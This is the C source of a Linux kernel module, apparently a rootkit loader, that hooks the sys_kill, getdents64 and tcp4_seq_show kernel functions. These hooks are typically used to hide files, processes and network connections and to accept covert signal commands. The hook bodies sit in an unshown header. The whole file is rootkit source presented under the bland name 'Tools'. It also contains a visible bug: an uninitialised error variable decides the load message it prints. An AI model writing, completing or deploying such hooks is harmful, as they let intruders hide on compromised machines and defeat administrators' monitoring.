#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include "hook.h"



static struct hook_information *sys_killhook;
static struct hook_information *sys_getdenthook;
static struct hook_information *tcp_seq_hook;
static int __init ToolInstall(void) {
    // Get Kernel Function Address
    if (GetKernelFunction() < 0) {
        pr_err("Get system function Error Or Don't Support your arch");
        return 0;
    }

    int err;
    sys_killhook = kmalloc(sizeof(struct hook_information),GFP_KERNEL);
    sys_killhook->hook_address = (unsigned long)sys_kill_;
    sys_killhook->hook_function = (unsigned long)Hook_syskill;

    sys_getdenthook = kmalloc(sizeof(struct hook_information),GFP_KERNEL);
    sys_getdenthook->hook_address = (unsigned long)sys_getdents64_;
    sys_getdenthook->hook_function = (unsigned long)Hook_getdents64;    

    tcp_seq_hook = kmalloc(sizeof(struct hook_information),GFP_KERNEL);
    tcp_seq_hook->hook_address = (unsigned long)tcp4_seq_show_;
    tcp_seq_hook->hook_function = (unsigned long)Hook_tcp4_seq_show;

    if(Initialize(sys_killhook)<0)
        goto done;
    if(Initialize(sys_getdenthook)<0)
        goto done;
    if(Initialize(tcp_seq_hook)<0)
        goto done;


done:
    pr_info("Tools Load %s", (err == 0) ? "Success" : "Failed");
    return 0;
}



static void __exit ToolUninstall(void){
    //When Kernel Unload UnInstall Hook
    UnInitialize(sys_killhook);
    UnInitialize(sys_getdenthook);
    UnInitialize(tcp_seq_hook);
}

MODULE_LICENSE("GPL");
module_init(ToolInstall);
module_exit(ToolUninstall);